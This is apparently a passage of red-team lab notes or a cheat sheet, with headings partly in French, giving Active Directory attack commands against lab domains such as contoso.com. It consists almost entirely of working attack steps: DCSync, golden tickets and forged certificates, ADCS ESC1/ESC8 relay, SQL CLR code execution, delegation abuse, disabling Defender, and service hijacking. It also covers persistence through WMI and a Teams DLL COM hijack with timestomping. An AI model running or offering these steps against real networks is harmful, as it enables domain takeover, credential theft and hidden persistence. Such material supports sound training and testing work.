ldapsearch (&(|(objectClass=organizationalUnit)(objectClass=domain))(gPLink=*{DFE606B4-CA59-4AD6-9BCE-55AF35888129}*)) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes objectClass,name
ldapsearch (samAccountType=805306369) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes distinguishedName

dcsync contoso.com CONTOSO\rsteel

krb_asktgt /user:rsteel /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960
krb_asktgs /service:krbtgt/partner.com /ticket:[TGT]
krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:[INTER-REALM]
ls \\\\par-jmp-1.partner.com\\c$
```

>Relations de confiance parent-enfant
```
ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName

ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes objectSid

dcsync dublin.contoso.com DUBLIN\krbtgt

C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /outfile:C:\Users\Attacker\Desktop\golden

kerberos_ticket_use C:\Users\Attacker\Desktop\[GOLDEN TICKET].kirbi
run klist

ls \\\\lon-dc-1\\c$
```

>DPERSIST1 — Golden Certificates et Persistence dans le domaine
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-self --dump-certs --quiet

[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\lon-cs-1.pfx", [Convert]::FromBase64String("[CERT]"))

C:\Tools\Certify\Certify\bin\Release\Certify.exe forge --ca-cert .\Desktop\lon-cs-1.pfx --upn Administrator --subject CN=Administrator,CN=Users,DC=contoso,DC=com --sid S-1-5-21-3926355307-1661546229-813047887-500 --crl ldap:///CN=CONTOSO Root CA,CN=lon-cs-1,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=CONTOSO,DC=com

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO /certificate:[FORGED CERT] /enctype:aes256 /nowrap
```

>ADCS ESC8
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet

socks 1080 socks5
netstat

sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
sc_stop lanmanserver
sc_stop srv2
sc_stop srvnet

netstat
rportfwd_local 445 localhost 7445
netstat

powerpick New-NetFirewallRule -DisplayName "File Sharing" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 445

docker container start -i kali-1
nano /etc/proxychains.conf

socks5 10.0.0.5 1080

proxychains impacket-ntlmrelayx -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108

socks stop
rportfwd stop 445
sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 2
sc_start srvnet
sc_start srv2
sc_start lanmanserver

powerpick Remove-NetFirewallRule -DisplayName "File Sharing"
```

ADCS ESC1
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[CERT] /enctype:aes256 /nowrap
```

SQL Servers
```
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName

sql-info lon-db-1
sql-whoami lon-db-1

ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member

sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"

sql-enableclr lon-db-1

C:\Payloads\smb_x64.xthread.bin

sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure

link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337

sql-disableclr lon-db-1

sql-links lon-db-1

sql-whoami lon-db-1 "" lon-db-2
sql-checkrpc lon-db-1

sql-enablerpc lon-db-1 lon-db-2

sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure "" lon-db-2

sql-disablerpc lon-db-1 lon-db-2
whoami

C:\Payloads\tcp-local_x64.exe

cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
upload C:\Payloads\tcp-local_x64.exe

execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
connect localhost 1337
```

>RBCD
```
socks 1080 socks5

Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"

Set-MpPreference -DisableRealtimeMonitoring $true

krb_tgtdeleg
runas /netonly /user:CONTOSO\pchilds powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt

ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
Get-DomainComputer -Server 'lon-dc-1' | Get-DomainObjectAcl -Server 'lon-dc-1' | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -eq 'WriteProperty' } | select ObjectDN,SecurityIdentifier
Get-DomainObject -LDAPFilter '(objectSid=S-1-5-21-3926355307-1661546229-813047887-1107)' -Server 'lon-dc-1'

C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe purge

C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt

Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount

$ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 'lon-dc-1'
$wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 'lon-dc-1'
Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 'lon-dc-1'

Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount

C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-wkstn-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /dc:lon-dc-1 /outfile:C:\Users\Attacker\Desktop\

Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1 -Server 'lon-dc-1'
Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
```

>S4U2Self
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:3 /targetuser:lon-dc-1$ /nowrap
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1

krb_s4u /ticket:[TGT] /self /altservice:cifs/lon-dc-1 /impersonateuser:Administrator
```

>Substitution du nom de service
```
krb_s4u /ticket:[TGT] /service:time/lon-fs-1 /altservice:cifs /impersonateuser:Administrator
```

>Constrained Delegation
```
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl

[Convert]::ToBoolean(16781312 -band 16777216)

krb_dump /luid:3e7 /service:krbtgt
krb_s4u /ticket:[TGT] /service:cifs/lon-fs-1 /impersonateuser:Administrator
```

>Unconstrained Delegation
```
ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName

krb_triage

ldapsearch samAccountName=dyork --attributes memberOf

krb_dump /user:dyork /service:krbtgt
```

>Lateral Movement
```
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe`
jump scshell64 xxx-xxxxx-2 smb
```

>User Impersonation
```
ls \\\\lon-ws-1\\c$

krb_triage
krb_dump /user:rsteel /service:krbtgt

[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("[B64 TICKET]"))

make_token CONTOSO\rsteel FakePass
kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi

run klist
ls \\\\lon-ws-1\\c$
rev2self
```

>Elevated Persistence
```
C:\Tools\WmiPersistence.ps1

C:\Payloads\dns_x64.exe

upload C:\Payloads\dns_x64.exe
mv dns_x64.exe windbg.exe

powershell-import C:\Tools\WmiPersistence.ps1
psinject [BEACON PID] x64 Add-WmiPersistence
execute gpupdate /target:computer /force
psinject [BEACON PID] x64 Remove-WmiPersistence
```

>Privilege Escalation
```
spawnto x64 C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe

powerpick $lowpriv = @('Everyone', 'BUILTIN\Users', 'NT AUTHORITY\Authenticated Users'); ls 'HKLM:\SYSTEM\CurrentControlSet\Services' | % { $acl = Get-Acl $_.PSPath; foreach ($ace in $acl.Access) { if ($ace.AccessControlType -eq 'Allow' -and $ace.IsInherited -eq $false -and $lowpriv -contains $ace.IdentityReference.Value -and $ace.RegistryRights -eq [System.Security.AccessControl.RegistryRights]::FullControl) { [PSCustomObject] @{ServiceName = $_.PSChildName; Identity = $ace.IdentityReference.Value; Rights = $ace.RegistryRights }}}}

ak-settings spawnto_x64 C:\Windows\System32\svchost.exe

C:\Payloads\http_x64.svc.exe
sc_stop BadWindowsService

cd C:\Temp
upload C:\Payloads\http_x64.svc.exe

sc_qc BadWindowsService
sc_config BadWindowsService C:\Temp\http_x64.svc.exe 0 2
sc_start BadWindowsService

sc_config BadWindowsService "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe" 0 2
rm http_x64.svc.exe
sc_start BadWindowsService
```

>Persistence
```
C:\Payloads\http_x64.dll

cd C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64

upload C:\Payloads\http_x64.dll

mv http_x64.dll Microsoft.Teams.HttpClient.dll
timestomp Microsoft.Teams.HttpClient.dll Microsoft.Teams.Diagnostics.dll

reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll"
reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "ThreadingModel" REG_SZ "Both"
```

